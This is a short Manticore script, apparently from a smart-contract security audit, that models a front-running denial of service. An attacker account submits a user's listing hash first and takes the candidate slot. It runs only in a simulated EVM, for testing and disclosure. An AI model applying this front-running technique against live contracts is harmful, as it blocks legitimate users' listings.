"""
Candidate proposal denial of service by front-running transactions
"""
from manticore.ethereum import ManticoreEVM
from manticore.utils import config

from initialize_market import initialize, DEFAULT_PARAMETERS
from constants import ONE_ETH

consts = config.get_group("evm")
consts.oog = "ignore"

################ Script #######################

m = ManticoreEVM()

market_parameters = DEFAULT_PARAMETERS
market = initialize(m, parameters=market_parameters)

user_balance = 100 * ONE_ETH
user_account = m.create_account(balance=user_balance)
print("[+] Creating a user account", hex(user_account.address))

attacker_balance = 100 * ONE_ETH
attacker_account = m.create_account(balance=attacker_balance)
print("[+] Creating a attacker account", hex(attacker_account.address))

# The manticore script shows that if the two accounts
# submit listing requests with the same hash, it is
# possible for the attacker's listing to become a
# candidate rather than a user. This models the case in
# which a sophisticated attacker front-runs a listing
# candidate.
user_list_hash = "my_list_hash"
market.listing_contract.list(user_list_hash, caller=attacker_account)
market.listing_contract.list(user_list_hash, caller=user_account)

m.finalize()
print(f"[+] Look for results in {m.workspace}")
